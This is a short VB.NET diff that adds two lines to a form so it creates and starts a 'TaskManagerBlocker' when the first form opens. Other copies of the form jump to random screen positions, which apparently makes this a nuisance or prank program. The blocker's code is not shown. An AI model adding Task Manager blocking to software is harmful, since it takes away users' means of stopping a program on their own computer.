@@ -10,6 +10,8 @@ Public Class mainForm
 
         If (isFirstForm = True) Then
             isFirstForm = False
+            Dim blocker As New TaskManagerBlocker()
+            blocker.Start()
         Else
             Randomize()
             Me.Location = New Point(Rnd() * (Screen.PrimaryScreen.Bounds.Width - Me.Width + 1),
